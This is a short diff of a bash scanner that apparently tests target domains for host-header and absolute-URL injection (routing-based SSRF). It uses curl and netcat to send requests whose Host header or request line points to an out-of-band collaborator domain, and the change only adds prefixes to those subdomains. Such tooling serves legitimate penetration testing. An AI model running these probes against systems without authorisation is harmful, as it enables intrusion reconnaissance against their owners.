@@ -52,7 +52,7 @@ inject_host_header() {
     # Increment the counter
     counter=$((counter + 1))
     # Send the HTTP GET request using curl (background) with additional headers
-    curl -H "Host: $UD.h.$Collab"  "$domain" &> /dev/null &
+    curl -H "Host: h-$UD.$Collab"  "$domain" &> /dev/null &
     # Print the processed domain for reference
     echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_host_header.log
     # Wait for $Delay seconds before next iteration
@@ -110,8 +110,8 @@ inject_absolute_url() {
     # Increment the counter
     counter=$((counter + 1))
     # Send the row HTTP GET request using nc (background)
-    echo -e "GET http://$UD.$Collab/ HTTP/1.1\r\nHost: $UD\r\n" | nc -q 1 $UD 80  &> /dev/null &
-    echo -e "GET http://$UD.$Collab/ HTTP/2\r\nHost: $UD\r\n" | nc -q 1 $UD 443 &> /dev/null &
+    echo -e "GET http://a-$UD.$Collab/ HTTP/1.1\r\nHost: $UD\r\n" | nc -q 1 $UD 80  &> /dev/null &
+    echo -e "GET http://a-$UD.$Collab/ HTTP/2\r\nHost: $UD\r\n" | nc -q 1 $UD 443 &> /dev/null &
     echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_absolute_url.log
     # Wait for $Delay seconds before next iteration
     sleep $delay
